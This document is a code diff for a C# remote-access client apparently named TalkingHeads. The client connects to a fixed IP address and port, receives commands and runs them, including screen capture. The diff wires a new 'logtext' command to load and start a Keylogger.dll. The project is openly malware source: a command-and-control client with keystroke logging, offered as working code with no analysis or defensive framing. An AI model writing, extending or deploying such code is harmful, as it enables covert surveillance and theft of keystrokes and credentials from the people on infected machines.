@@ -4,6 +4,7 @@ using System.Text;
 using TalkingHeads.Commands;
 
 CmdController CMDController = null;
+DLLInvoker DLLInvoker = null;
 while (true)
 {
     Console.Write("Type 'Y' for connect or 'N' to exit: \n>>> ");
@@ -19,6 +20,7 @@ while (true)
             using TcpClient tcpClient = new TcpClient("192.168.178.100", 1338);
             NetworkStream stream = tcpClient.GetStream();
             CMDController = new CmdController();
+            DLLInvoker = new DLLInvoker();
             Console.WriteLine("Connected! Waiting for command...");
 
             byte[] buffer = new byte[1028];
@@ -49,6 +51,7 @@ while (true)
         finally
         {
             CMDController?.Dispose();
+            DLLInvoker?.Dispose();
         }
     }
 }
@@ -70,9 +73,9 @@ async Task<string> ExecuteCommand(string command)
             case "screen":
                 WindowsTools.CaptureScreen(args);
                 return "[Not implemented: screenshot]";
-            case "logText":
-                WindowsTools.CaptureScreen(args);
-                return "[Not implemented: screenshot]";
+            case "logtext":
+
+                return DLLInvoker.Execute("C:\\Development\\TalkingHeads\\TalkingHeads_Client\\x64\\Release\\Keylogger.dll", "start");
             case "search":
                 //Search state wo man dateien und ordner suchen kann...
                 //Datei oder ornder auswählen und optionen zum bearbeiten...
